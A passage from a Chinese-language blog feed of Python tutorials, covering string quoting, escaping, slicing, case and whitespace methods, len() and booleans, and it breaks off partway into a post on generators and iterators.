<li><font face="Comic sans MS"><font color="red" face="Comic sans MS"><strong>区分单引号和双引号：</strong></font>字符串是以单引号**<code>&#39;</code><strong>或双引号</strong><code>&quot;</code><strong>括起来的任意文本，比如</strong><code>&#39;abc&#39;</code><strong>，</strong><code>&quot;xyz&quot;</code><strong>等等。</font><br><font face="Comic sans MS"><strong>请注意</strong>：</strong><code>&#39;&#39;</code><strong>或</strong><code>&quot;&quot;</code><strong>本身只是一种表示方式，不是字符串的一部分，因此，字符串</strong><code>&#39;abc&#39;</code><strong>只有</strong><code>a</code><strong>，</strong><code>b</code><strong>，</strong><code>c</code><strong>这3个字符。如果<code>&#39;</code>本身也是一个字符，那就可以用<code>&quot;&quot;</code>括起来，比如<code>&quot;I&#39;m OK&quot;</code>包含的字符是</strong><code>I</code><strong>，</strong><code>&#39;</code><strong>，</strong><code>m</code><strong>，</strong><code>空格</code><strong>，</strong><code>O</code><strong>，</strong><code>K</code>**这6个字符。<br>即<font color="#FF7F00"><strong>单引号要放到双引号里面，双引号要放到单引号里面</strong></font>。</font></li>
</ol>
<br>

<ol start="2">
<li><font color="red" face="Comic sans MS"><strong>使用转义字符“<code>\</code>”</strong></font> ： <font face="Microsoft YaHei">如果字符串内部既包含**<code>&#39;</code><strong>又包含</strong><code>&quot;</code><strong>怎么办？可以用转义字符</strong><code>\</code>**来标识，比如：</font></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="string">&#x27;I\&#x27;m \&quot;OK\&quot;!&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line">运行输出：</span><br><span class="line">I<span class="string">&#x27;m &quot;OK&quot;! </span></span><br></pre></td></tr></table></figure>

<br>

<p><font face="Microsoft YaHei">把双引号括在单引号里面，但是下面的单引号必须转义，如下也是正确的：</font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="string">&#x27;I\&#x27;m &quot;OK&quot;!&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure>

<br>

<ol start="3">
<li><font color="red" face="Comic sans MS"><strong>使用不转义字符“<code>r&#39;&#39;</code>”</strong></font>： <font face="Microsoft YaHei">如果字符串里面有很多字符都需要转义，就需要加很多**<code>\</code><strong>，为了简化，Python还允许用<code>r&#39;&#39;</code>表示，<font color="#FF7F00"></strong><code>&#39;&#39;</code>内部的字符串默认不转义**</font>，可以自己试试：</font></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="string">&#x27;\\\t\\&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line">a=<span class="string">r&#x27;\\\t\\&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">\	\ </span><br><span class="line">\\\t\\ </span><br></pre></td></tr></table></figure>


<br>

<ol start="4">
<li><font color="red" face="Comic sans MS"><strong>在字符串里面有换行，将字符串按照换行输出。使用</strong><code>&#39;&#39;&#39;  内容  &#39;&#39;&#39;</code><strong>：</strong></font><font face="Microsoft YaHei">如果字符串内部有很多换行，用**<code>\n</code><strong>写在一行里不好阅读，为了简化，Python允许用</strong><code>&#39;&#39;&#39; 这里写内容&#39;&#39;&#39;</code>**的格式表示多行内容，可以自己试试：</font></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="string">&#x27;&#x27;&#x27;hello</span></span><br><span class="line"><span class="string">world</span></span><br><span class="line"><span class="string">line1</span></span><br><span class="line"><span class="string">line2&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line">运行输出：</span><br><span class="line">hello </span><br><span class="line">world </span><br><span class="line">line1 </span><br><span class="line">line2 </span><br></pre></td></tr></table></figure>

<br>

<ol start="5">
<li><font color="red" face="Comic sans MS"><strong>在字符串里面有换行，将字符串按照换行输出，并且不转义输出字符。使用<code>r&#39;&#39;&#39;  &#39;&#39;&#39;</code>：</strong></font></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="string">r&#x27;&#x27;&#x27;hello \n</span></span><br><span class="line"><span class="string">world</span></span><br><span class="line"><span class="string">line1</span></span><br><span class="line"><span class="string">line2&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line">运行输出：</span><br><span class="line">hello \n </span><br><span class="line">world </span><br><span class="line">line1 </span><br><span class="line">line2 </span><br></pre></td></tr></table></figure>


<br>

<h5 id="2-使用字符串-取下标"><a href="#2-使用字符串-取下标" class="headerlink" title="2.使用字符串(取下标)"></a><font color="#00B2EE" face="Comic sans MS">2.使用字符串(取下标)</font></h5><blockquote>
<p><font face="Microsoft YaHei"><font color="#FF7F00"><strong>python的字串列表有2种取值顺序:</strong></font></font></p>
</blockquote>
<ol>
<li><font face="Microsoft YaHei">从左到右索引默认<font color="#FF7F00"><strong>0</strong></font>开始的，最大范围是字符串<strong>长度少1</strong>；</font></li>
<li><font face="Microsoft YaHei">从右到左索引默认-1开始的，最大范围是字符串开头。</font></li>
</ol>
<p><img data-src="https://i.loli.net/2019/02/27/5c7665042686e.png" alt="python-string-slice.png"></p>
<blockquote>
<ol start="3">
<li><font face="Microsoft YaHei">如果你要实现从字符串中获取一段<strong>子字符串</strong>的话，可以使用 <font color="#FF7F00"><strong>[头下标:尾下标]</strong></font> 来截取相应的字符串，其中下标是从 0 开始算起，可以是正数或负数，下标可以为空表示取到头或尾。</font></li>
<li><font face="Microsoft YaHei"><strong><code>[头下标:尾下标]</code></strong> 获取的子字符串包含头下标的字符，但<strong>不包含尾下标的字符</strong>。</font></li>
</ol>
</blockquote>
<br>

<p>比如:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&#x27;abcdef&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(s[<span class="number">2</span>])</span><br><span class="line"><span class="built_in">print</span>(s[<span class="number">1</span>:<span class="number">5</span>])</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">c </span><br><span class="line">bcde </span><br></pre></td></tr></table></figure>

<blockquote>
<p><font face="Microsoft YaHei">当使用以冒号**<code>:</code>**分隔的字符串，python 返回一个新的对象，结果包含了以这对偏移标识的连续的内容，左边的开始是包含了下边界。<br>上面的结果包含了 s[1] 的值 b，而取到的最大范围不包括尾下标，就是 s[5] 的值 f。</font></p>
</blockquote>
<p><img data-src="https://i.loli.net/2019/02/27/5c76663ee5909.png" alt="9aU.png"></p>
<br>

<h5 id="3-加号-星号-冒号"><a href="#3-加号-星号-冒号" class="headerlink" title="3.加号(+)星号(*)冒号(:)"></a><font color="#00B2EE" face="Comic sans MS">3.加号(+)星号(*)冒号(:)</font></h5><blockquote>
<ol>
<li><font color="#FF7F00"><strong>加号(+)：</strong></font><strong>拼接字符串；</strong></li>
<li><font color="#FF7F00"><strong>星号(*)：</strong></font><strong>重复操作；</strong></li>
<li><font color="#FF7F00"><strong>冒号(:)：</strong></font><strong>截取字符。</strong></li>
</ol>
</blockquote>
<br>

<ol>
<li><font color="red"><strong>Python使用加号（ + ）来合并字符串</strong></font></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">first_name = <span class="string">&quot;ada&quot;</span></span><br><span class="line">last_name = <span class="string">&quot;lovelace&quot;</span></span><br><span class="line">full_name = first_name + <span class="string">&quot; &quot;</span> + last_name</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hello, &quot;</span> + full_name + <span class="string">&quot;!&quot;</span>)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">Hello, ada lovelace! </span><br></pre></td></tr></table></figure>

<br>

<ol start="2">
<li><font color="red"><strong>Python使用星号（ * ）来重复字符串</strong></font></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line">a=<span class="built_in">str</span>*<span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line">运行输出：</span><br><span class="line">Hello World!Hello World! </span><br></pre></td></tr></table></figure>

<br>

<ol start="3">
<li><font color="red"><strong>Python使用冒号（ ： ）来截取字符</strong></font></li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line"> </span><br><span class="line">str = <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line"> </span><br><span class="line">print str           # 输出完整字符串</span><br><span class="line">print str[0]        # 输出字符串中的第一个字符</span><br><span class="line">print str[2:5]      # 输出字符串中第三个至第五个之间的字符串</span><br><span class="line">print str[2:]       # 输出从第三个字符开始的字符串</span><br><span class="line">print str * 2       # 输出字符串两次</span><br><span class="line">print str + &quot;TEST&quot;  # 输出连接的字符串</span><br><span class="line"></span><br><span class="line">以上实例输出结果：</span><br><span class="line">Hello World!</span><br><span class="line">H</span><br><span class="line">llo</span><br><span class="line">llo World!</span><br><span class="line">Hello World!Hello World!</span><br><span class="line">Hello World!TEST</span><br></pre></td></tr></table></figure>


<blockquote>
<p><font face="Microsoft YaHei">Python 列表截取可以接收第三个参数，<font color="#FF7F00"><strong>参数作用是截取的步长，以下实例在索引 1 到索引 4 的位置并设置为步长为 2（间隔一个位置）来截取字符串：</strong></font></font></p>
</blockquote>
<p><img data-src="https://i.loli.net/2019/02/27/5c766ace2223e.png" alt="python_list_slice_2.png"></p>
<br>

<h5 id="4-常用的字符串方法"><a href="#4-常用的字符串方法" class="headerlink" title="4.常用的字符串方法"></a><font color="#00B2EE" face="Comic sans MS">4.常用的字符串方法</font></h5><h6 id="1-修改字符串的大小写"><a href="#1-修改字符串的大小写" class="headerlink" title="1. 修改字符串的大小写"></a><font color="#20B2AA" face="Comic sans MS">1. 修改字符串的大小写</font></h6><blockquote>
<p><font color="#FF7F00"><strong>使用方法：</strong></font></p>
</blockquote>
<ol>
<li>**upper()**：将字符串<font color="#FF7F00"><strong>所有字母大写</strong></font>；</li>
<li>**lower()**：将字符串<font color="#FF7F00"><strong>所有字母小写</strong></font>；</li>
<li>**title()**：将字符串<font color="#FF7F00"><strong>所有单词首字母大写，并将单词中除了首字母的变为小写</strong></font>。</li>
</ol>
<br>

<p>示例代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&quot;Hexo lovelace giTHub toMMrow n&quot;</span></span><br><span class="line"><span class="built_in">print</span>(name.upper())</span><br><span class="line"><span class="built_in">print</span>(name.lower())</span><br><span class="line"><span class="built_in">print</span>(name.title())</span><br><span class="line"></span><br><span class="line">运行输出：</span><br><span class="line">HEXO LOVELACE GITHUB TOMMROW N </span><br><span class="line">hexo lovelace github tommrow n </span><br><span class="line">Hexo Lovelace Github Tommrow N </span><br></pre></td></tr></table></figure>


<p><font face="Microsoft YaHei">在**<code>name.title()</code>** 中，name 后面的句点（ <strong><code>.</code></strong> ）让Python对变量name 执行方法title() 指定的操作。每个方法后面都跟着一对括号，这是因为方法通常需要<font color="#FF7F00"><strong>额外的信息来完成其工作</strong></font>。这种信息是在括号内提供的。函数title() 不需要额外的信息，因此它后面的括号是空的。</font></p>
<br>

<h6 id="2-暂时-x2F-永久删除字符串两端空白"><a href="#2-暂时-x2F-永久删除字符串两端空白" class="headerlink" title="2. 暂时&#x2F;永久删除字符串两端空白"></a><font color="#20B2AA" face="Comic sans MS">2. 暂时&#x2F;永久删除字符串两端空白</font></h6><blockquote>
<p><font color="#FF7F00"><strong>使用方法：</strong></font></p>
</blockquote>
<ol>
<li><font face="Microsoft YaHei"><strong>strip()：</strong>删除字符串<font color="#FF7F00"><strong>两端</strong></font>空白或换行符；</font></li>
<li><font face="Microsoft YaHei"><strong>lstrip()：</strong>删除字符串<font color="#FF7F00"><strong>左</strong></font>端空白或换行符；</font></li>
<li><font face="Microsoft YaHei"><strong>rstrip()：</strong>删除字符串<font color="#FF7F00"><strong>右</strong></font>端空白或换行符；</font></li>
</ol>
<br>

<blockquote>
<p><font face="Microsoft YaHei"><font color="#FF7F00"><strong>暂时</strong></font>或者是<font color="#FF7F00"><strong>永久</strong></font>删除的区别是在于调用方法后是否重新赋值给一个变量：</font></p>
</blockquote>
<ol>
<li><font face="Microsoft YaHei"><strong>不赋值：</strong><font color="#FF7F00">暂时删除，下次调用时还是原字符串</font>；</font></li>
<li><font face="Microsoft YaHei"><strong>重新赋值：</strong><font color="#FF7F00">永久删除</font>。</font></li>
</ol>
<br>

<p>示例代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&quot;    HexoAndGithub  &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(name)</span><br><span class="line"><span class="built_in">print</span>(name.strip())</span><br><span class="line"><span class="built_in">print</span>(name.rstrip())</span><br><span class="line"><span class="built_in">print</span>(name.lstrip())</span><br><span class="line"><span class="built_in">print</span>(name)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">name = name.strip()</span><br><span class="line"><span class="built_in">print</span>(name)</span><br><span class="line"><span class="built_in">print</span>(name.strip())</span><br><span class="line"><span class="built_in">print</span>(name.rstrip())</span><br><span class="line"><span class="built_in">print</span>(name.lstrip())</span><br><span class="line"><span class="built_in">print</span>(name)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">    HexoAndGithub   </span><br><span class="line">HexoAndGithub </span><br><span class="line">    HexoAndGithub </span><br><span class="line">HexoAndGithub   </span><br><span class="line">    HexoAndGithub   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HexoAndGithub </span><br><span class="line">HexoAndGithub </span><br><span class="line">HexoAndGithub </span><br><span class="line">HexoAndGithub </span><br><span class="line">HexoAndGithub </span><br></pre></td></tr></table></figure>


<br>

<h6 id="3-内置函数-len-返回字符串长度"><a href="#3-内置函数-len-返回字符串长度" class="headerlink" title="3. 内置函数 len()返回字符串长度"></a><font color="#20B2AA" face="Comic sans MS">3. 内置函数 len()返回字符串长度</font></h6><p><font face="Microsoft YaHei">内置函数 len() 返回字符串长度，注意，它<strong>并不是字符串的方法！！！</strong></font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;supercalifragilisticexpialidocious&#x27;</span></span><br><span class="line">b = <span class="built_in">len</span>(a)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">supercalifragilisticexpialidocious </span><br><span class="line"><span class="number">34</span> </span><br></pre></td></tr></table></figure>


<br>

<h4 id="3-4-布尔值"><a href="#3-4-布尔值" class="headerlink" title="3.4 布尔值"></a><font color="#3CB371" face="Comic sans MS">3.4 布尔值</font></h4><ol>
<li><p><font face="Microsoft YaHei">布尔值和布尔代数的表示完全一致，一个布尔值只有**<code>True</code><strong>、</strong><code>False</code>**两种值，要么是True，要么是False；</font></p>
</li>
<li><p><font face="Microsoft YaHei">在Python中，True、False<font color="#FF7F00"><strong>首字母必须大写</strong></font>。可以直接用True、False表示布尔值，请注意大小写，也可以通过布尔运算计算出来：</font></p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="literal">True</span></span><br><span class="line">b=<span class="number">3</span>&gt;<span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(a,b)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="literal">True</span> <span class="literal">True</span> </span><br></pre></td></tr></table></figure>

<br>

<ol start="3">
<li><font face="Microsoft YaHei"><strong>布尔值可以用<code>and</code>、<code>or</code>和<code>not</code>运算</strong></font><ol>
<li><font face="Microsoft YaHei"><strong><code>and</code><strong>运算是</strong>与运算</strong>，只有<font color="#FF7F00"><strong>所有都为True，and运算结果才是True</strong></font> </font></li>
<li><font face="Microsoft YaHei"><strong><code>or</code><strong>运算是</strong>或运算</strong>，只要<font color="#FF7F00"><strong>其中有一个为True，or运算结果就是True</strong></font> </font></li>
<li><font face="Microsoft YaHei"><strong><code>not</code><strong>运算是</strong>非运算</strong>，它是一个单目运算符，<font color="#FF7F00"><strong>把True变成False，False变成True</strong></font> </font>s</li>
</ol>
</li>
</ol>
<br>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a= <span class="number">5</span> &gt; <span class="number">3</span> <span class="keyword">and</span> <span class="number">3</span> &lt; <span class="number">1</span></span><br><span class="line">b= <span class="number">5</span> &gt; <span class="number">3</span> <span class="keyword">or</span> <span class="number">1</span> &gt; <span class="number">3</span></span><br><span class="line">c= <span class="keyword">not</span> <span class="number">1</span> &gt; <span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="literal">False</span> </span><br><span class="line"><span class="literal">True</span> </span><br><span class="line"><span class="literal">True</span> </span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-生成器与迭代器</title>
    <url>/post/Python-generator-iterator/</url>
    <content><![CDATA[<p>生成器生成想要的数据，可控制循环暂停，迭代器把可迭代的对象转换为生成器。( ⸝⸝⸝•_•⸝⸝⸝ )♡︎♡︎</p>
<span id="more"></span>

<br>

<br>

<center><font color="#00B2EE" face="Comic sans MS" size=5>生成器与迭代器</font> </center>

<br>

<br>


<h3 id="一-迭代、列表生成式"><a href="#一-迭代、列表生成式" class="headerlink" title="一. 迭代、列表生成式"></a><font color="#FF6347" face="Comic sans MS">一. 迭代、列表生成式</font></h3><h4 id="1-1-迭代"><a href="#1-1-迭代" class="headerlink" title="1.1 迭代"></a><font color="#3CB371" face="Comic sans MS">1.1 迭代</font></h4><p><font color="#FF7F00"><strong>迭代：</strong></font>如果给定一个list或tuple，我们可以通过for循环来遍历这个list或tuple，这种遍历我们称为迭代（Iteration）。<font color="#FF7F00"><strong>Python的for…in循环就是迭代</strong></font>。</p>
<p>list这种数据类型虽然有下标，但很多其他数据类型是没有下标的，但是，只要是可迭代对象，无论有无下标，都可以迭代，比如dict就可以迭代：</p>
<p><font color="#FF7F00"></font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">d = &#123;<span class="string">&#x27;a&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;b&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;c&#x27;</span>: <span class="number">3</span>&#125;</span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> d:</span><br><span class="line">    <span class="built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">a</span><br><span class="line">b</span><br><span class="line">c</span><br></pre></td></tr></table></figure>

<br>

<blockquote>
<ol>
<li>因为dict、set的存储不是按照list的方式顺序排列，所以，迭代出的结果顺序很可能不一样。</li>
<li>默认情况下，dict迭代的是key。如果要迭代value，可以用<code>for value in d.values()</code>，如果要同时迭代key和value，可以用<code>for k, v in d.items()</code>。</li>
<li>当我们使用for循环时，只要作用于一个<font color="#FF7F00"><strong>可迭代对象</strong></font>，for循环就可以正常运行，而我们不太关心该对象究竟是list还是其他数据类型。</li>
</ol>
</blockquote>
<p>最后一个小问题，如果要对list实现类似Java那样的下标循环怎么办？<font color="#FF7F00"><strong>Python内置的enumerate函数可以把一个list变成索引-元素对</strong></font>，这样就可以在for循环中同时迭代索引和元素本身：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i, value <span class="keyword">in</span> <span class="built_in">enumerate</span>([<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>]):</span><br><span class="line">     <span class="built_in">print</span>(i, value)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">0</span> A</span><br><span class="line"><span class="number">1</span> B</span><br><span class="line"><span class="number">2</span> C</span><br></pre></td></tr></table></figure>

<br>

<br>

<h4 id="1-2-列表生成式"><a href="#1-2-列表生成式" class="headerlink" title="1.2 列表生成式"></a><font color="#3CB371" face="Comic sans MS">1.2 列表生成式</font></h4><p><strong>规则：</strong>for前面是一个表达式，表示将in后面的元素按照这个表达式进行计算出来后还要看in后面有没有筛选条件，<br>然后赋值给for…in中间的变量。格式如下：</p>
<p><font color="#FF7F00"><strong>表达式1 for 变量 in 可迭代对象 [表达式2]</strong></font></p>
<br>

<p>列表生成式即List Comprehensions，是Python内置的非常简单却强大的可以用来创建list的生成式。</p>
<p>举个例子，要生成list [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]可以用<code>list(range(1, 11))</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line">b = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>))	</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="number">7</span></span><br><span class="line"><span class="number">8</span></span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="number">10</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>]</span><br></pre></td></tr></table></figure>

<br>

<p>但如果要生成[1x1, 2x2, 3x3, …, 10x10]怎么做？方法一是循环：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">L = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">11</span>):</span><br><span class="line">    L.append(x * x)</span><br><span class="line"><span class="built_in">print</span>(L)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span>, <span class="number">36</span>, <span class="number">49</span>, <span class="number">64</span>, <span class="number">81</span>, <span class="number">100</span>]</span><br></pre></td></tr></table></figure>

<br>

<p>但是循环太繁琐，而<font color="#FF7F00"><strong>列表生成式</strong></font>则可以用一行语句代替循环生成上面的list：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [x * x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">11</span>)]</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span>, <span class="number">36</span>, <span class="number">49</span>, <span class="number">64</span>, <span class="number">81</span>, <span class="number">100</span>]</span><br></pre></td></tr></table></figure>

<br>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>前面是一个表达式，表示将<span class="keyword">in</span>后面的元素按照这个表达式进行计算出来后还要看<span class="keyword">in</span>后面有没有筛选条件，</span><br><span class="line">然后赋值给<span class="keyword">for</span>...<span class="keyword">in</span>中间的变量。格式如下：</span><br><span class="line"></span><br><span class="line">表达式<span class="number">1</span> <span class="keyword">for</span> 变量 <span class="keyword">in</span> 可迭代对象 [表达式<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> <span class="keyword">for</span>循环后面还可以加上<span class="keyword">if</span>判断，这样我们就可以筛选出仅偶数的平方：</span><br><span class="line"></span><br><span class="line">a = [x * x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">11</span>) <span class="keyword">if</span> x % <span class="number">2</span> == <span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">[<span class="number">4</span>, <span class="number">16</span>, <span class="number">36</span>, <span class="number">64</span>, <span class="number">100</span>]</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> 还可以使用两层循环，可以生成全排列：</span><br><span class="line"></span><br><span class="line">b = [m + n <span class="keyword">for</span> m <span class="keyword">in</span> <span class="string">&#x27;ABC&#x27;</span> <span class="keyword">for</span> n <span class="keyword">in</span> <span class="string">&#x27;XYZ&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">[<span class="string">&#x27;AX&#x27;</span>, <span class="string">&#x27;AY&#x27;</span>, <span class="string">&#x27;AZ&#x27;</span>, <span class="string">&#x27;BX&#x27;</span>, <span class="string">&#x27;BY&#x27;</span>, <span class="string">&#x27;BZ&#x27;</span>, <span class="string">&#x27;CX&#x27;</span>, <span class="string">&#x27;CY&#x27;</span>, <span class="string">&#x27;CZ&#x27;</span>]</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> <span class="keyword">for</span>循环其实可以同时使用两个甚至多个变量，比如<span class="built_in">dict</span>的items()可以同时迭代key和value：</span><br><span class="line"></span><br><span class="line">d = &#123;<span class="string">&#x27;x&#x27;</span>: <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;y&#x27;</span>: <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;C&#x27;</span> &#125;</span><br><span class="line">a = [k + <span class="string">&#x27;=&#x27;</span> + v <span class="keyword">for</span> k, v <span class="keyword">in</span> d.items()]</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">[<span class="string">&#x27;x=A&#x27;</span>, <span class="string">&#x27;y=B&#x27;</span>, <span class="string">&#x27;z=C&#x27;</span>]</span><br></pre></td></tr></table></figure>


<br>

<br>

<h3 id="二-生成器"><a href="#二-生成器" class="headerlink" title="二. 生成器"></a><font color="#FF6347" face="Comic sans MS">二. 生成器</font></h3><p>参考资料：<br><font face="Comic sans MS"><font color="#00B2EE">《<a href="https://www.cnblogs.com/wj-1314/p/8490822.html#undefined">python 生成器和迭代器有这篇就够了</a>》</font><br></font><font face="Comic sans MS"><font color="#00B2EE">《<a href="http://www.runoob.com/python3/python3-iterator-generator.html">Python3 迭代器与生成器</a>》</font><br></font><font face="Comic sans MS"><font color="#00B2EE">《<a href="http://www.runoob.com/w3cnote/python-yield-used-analysis.html">Python yield 使用浅析</a>》</font><br></font></p>
<br>

<p><font color="#00B2EE"><strong>什么是生成器？</strong></font></p>
<p>　　通过列表生成式，我们可以直接创建一个列表，但是，受到内存限制，列表容量肯定是有限的，而且创建一个包含100万个元素的列表，不仅占用很大的存储空间，如果我们仅仅需要访问前面几个元素，那后面绝大多数元素占用的空间都白白浪费了。</p>
<p>　　所以，如果列表元素可以按照某种算法推算出来，那我们是否可以在循环的过程中不断推算出后续的元素呢？这样就不必创建完整的list，从而节省大量的空间，在Python中，这种一边循环一边计算的机制，称为<strong>生成器：generator</strong></p>
<p>　　生成器是一个特殊的程序，可以被用作控制循环的迭代行为，python中生成器是迭代器的一种，使用yield返回值函数，每次调用yield会暂停，而可以使用next()函数和send()函数恢复生成器。</p>
<p>　　生成器类似于返回值为数组的一个函数，这个函数可以接受参数，可以被调用，但是，不同于一般的函数会一次性返回包括了所有数值的数组，生成器一次只能产生一个值，这样消耗的内存数量将大大减小，而且允许调用函数可以很快的处理前几个返回值，因此生成器看起来像是一个函数，但是表现得却像是迭代器</p>
<br>

<blockquote>
<p><font color="#FF7F00"><strong>python提供了两种生成器基本的方式</strong></font><br><font color="#FF7F00"><strong>生成器函数：</strong></font>也是用def定义的，利用关键字yield一次返回一个结果、阻塞，重新开始<br><font color="#FF7F00"><strong>生成器表达式：</strong></font>返回一个对象，这个对象只有在需要的时候才产生结果</p>
</blockquote>
<br>

<br>

<h4 id="2-1-yield、-next-、send"><a href="#2-1-yield、-next-、send" class="headerlink" title="2.1 yield、__next__()、send()"></a><font color="#3CB371" face="Comic sans MS">2.1 yield、__next__()、send()</font></h4><br>

<ol>
<li><p>带有yield语句的函数不再是一个普通的函数，而是一个生成器generator，可用于迭代。</p>
</li>
<li><p>yield是一个类似return 的关键字，<font color="#FF7F00"><strong>返回一个值或者表达式</strong></font>，迭代一次遇到yield的时候就返回yield后面（代码块）或者右面（单行）的值，然后暂停。</p>
</li>
